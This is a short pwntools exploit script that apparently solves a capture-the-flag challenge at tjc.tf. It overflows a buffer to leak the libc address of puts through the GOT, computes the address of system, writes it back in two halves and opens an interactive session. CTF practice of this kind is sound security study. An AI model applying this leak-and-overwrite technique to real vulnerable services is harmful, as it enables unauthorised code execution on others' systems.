from pwn import *

elf = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = elf

# p = process(stdout=PIPE)
p = remote("tjc.tf", 31509)
# gdb.attach(p)

p.sendlineafter(b') ', b'1')
payload = b'a' * 132 + pack(elf.got['puts'])
p.sendlineafter(b'? ', payload)

p.recvline()
p.recvline()

lower = int(p.recvuntil(b':', drop=True))
p.recvuntil(b'- ')
upper = int.from_bytes(p.recvline().strip(), 'little')
leak = (upper << 32) + lower

libc_base = leak - libc.symbols['puts']

lower = (libc_base + libc.symbols['system']) & ((1 << 33)- 1)
upper = (libc_base + libc.symbols['system']) >> 32
p.sendlineafter(b') ', str(lower))
pause()
p.sendlineafter(b'? ', pack(upper))

p.interactive()
